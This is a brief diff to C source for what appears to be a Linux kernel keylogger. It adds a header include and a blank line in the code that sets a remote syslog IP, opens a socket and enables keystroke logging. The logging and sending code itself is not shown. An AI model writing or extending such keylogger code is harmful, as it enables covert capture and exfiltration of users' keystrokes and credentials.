@@ -1,6 +1,7 @@
 #include <linux/netdevice.h>
 #include <linux/in.h>
 
+#include "kernel_variables.h"
 #include "keylogger.h"
 
 #define SYSLOG_PORT 514
@@ -185,6 +186,7 @@ void init_keylogger(void)
 
   // Set the given IP (initializes and connects the socket, too)
   set_syslog_ip(syslog_ip);
+
   enable_keylogger();
 }
 
